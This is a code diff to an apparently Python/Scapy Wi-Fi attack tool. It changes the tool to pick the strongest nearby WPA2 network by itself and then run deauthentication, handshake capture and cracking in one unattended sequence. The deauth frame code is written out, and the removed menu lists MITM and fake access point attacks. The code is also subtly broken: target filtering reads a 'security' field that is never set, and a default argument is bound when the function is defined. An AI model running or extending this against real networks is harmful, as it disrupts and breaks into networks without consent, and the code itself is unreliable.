@@ -28,9 +28,11 @@ def scan_networks(timeout=10):
         if pkt.haslayer(Dot11Beacon):
             essid = pkt[Dot11Elt].info.decode() if pkt[Dot11Elt].info else "Hidden SSID"
             bssid = pkt[Dot11].addr2
+            signal_strength = -(256 - ord(pkt.notdecoded[-4:-3])) if pkt.notdecoded else "Unknown"
             if bssid not in networks:
-                networks[bssid] = essid
-                print(f"[*] Found network: {essid} - {bssid}")
+
+                networks[bssid] = {'essid': essid, 'signal': signal_strength}
+                print(f"[*] Found network: {essid} - {bssid} (Signal: {signal_strength} dBm)")
 
     # Run sniffing in a thread to avoid blocking the main code
     global sniffing_thread
@@ -44,32 +46,32 @@ def scan_networks(timeout=10):
     sniffing_thread.join()  # Wait for sniffing to complete
     print("[*] Scanning complete.")
 
-# Function to select a network
+
+# Function to automatically select the strongest WPA2 network
 def select_network():
     if not networks:
         print("[-] No networks found. Run a scan first (Option 1).")
         return False
 
-    print("\n[*] Available Networks:")
-    for idx, (bssid, essid) in enumerate(networks.items(), start=1):
-        print(f"{idx}. {essid} ({bssid})")
+    # Filter networks with WPA2 and sort by signal strength (higher is better)
+    wpa2_networks = [(bssid, info) for bssid, info in networks.items() if 'WPA2' in info.get('security', '')]
+    wpa2_networks.sort(key=lambda x: x[1]['signal'], reverse=True)
 
-    try:
-        choice = int(input("Select a network (1-{}): ".format(len(networks))))
-        selected_bssid = list(networks.keys())[choice - 1]
-        selected_essid = networks[selected_bssid]
-
-        global selected_ap_mac, selected_ap_essid
-        selected_ap_mac = selected_bssid
-        selected_ap_essid = selected_essid
-        print(f"[*] Selected {selected_ap_essid} ({selected_ap_mac}).")
-        return True
-    except (ValueError, IndexError):
-        print("[-] Invalid selection.")
+    if not wpa2_networks:
+        print("[-] No WPA2 networks found.")
         return False
 
+    # Select the network with the strongest signal
+    selected_bssid, selected_info = wpa2_networks[0]
+
+    global selected_ap_mac, selected_ap_essid
+    selected_ap_mac = selected_bssid
+    selected_ap_essid = selected_info['essid']
+
+    print(f"[*] Automatically selected the strongest WPA2 network: {selected_ap_essid} ({selected_ap_mac}) - Signal: {selected_info['signal']} dBm")
+    return True
 # Function to send deauthentication frames
-def send_deauth_frames(ap_mac, client_mac="FF:FF:FF:FF:FF:FF", count=100):
+def send_deauth_frames(ap_mac=selected_ap_mac, client_mac="FF:FF:FF:FF:FF:FF", count=100):
     print(f"[*] Sending deauth frames to {ap_mac} targeting {client_mac}...")
     dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
     packet = RadioTap()/dot11/Dot11Deauth(reason=7)
@@ -132,45 +134,17 @@ def create_fake_aps():
         create_fake_ap(essid, channel)
     print("[*] Fake APs created.")
 
-# Offensive menu
-def offensive_menu():
-    while True:
-        print("Offensive Options:")
-        print("1. Scan Networks")
-        print("2. Deauth and Capture Handshake")
-        print("3. Crack Handshake")
-        print("4. MITM Attack")
-        print("5. Create Fake APs")
-
-        choice = input("Select an option (1-5): ")
-        if choice == '1':
-            scan_networks()
-        elif choice == '2':
-            if select_network():
-                send_deauth_frames(selected_ap_mac)
-                capture_handshake()
-                check_handshake()
-        elif choice == '3':
-            crack_handshake()
-        elif choice == '4':
-            mitm_attack()
-        elif choice == '5':
-            create_fake_aps()
-        elif choice == '6':
-            audit.scan_networks()
-            audit.audit_networks()
-        elif choice == '7':
-            break
-            
-        
-        else:
-            print("Invalid choice.")
 
 # Main menu
-def main_menu():
+def run():
+    scan_networks()
+    select_network()
+    send_deauth_frames()
+    capture_handshake()
+    check_handshake()
+    crack_handshake()
     
     
-    offensive_menu()
 
 if __name__ == "__main__":
-    main_menu()
+    run()
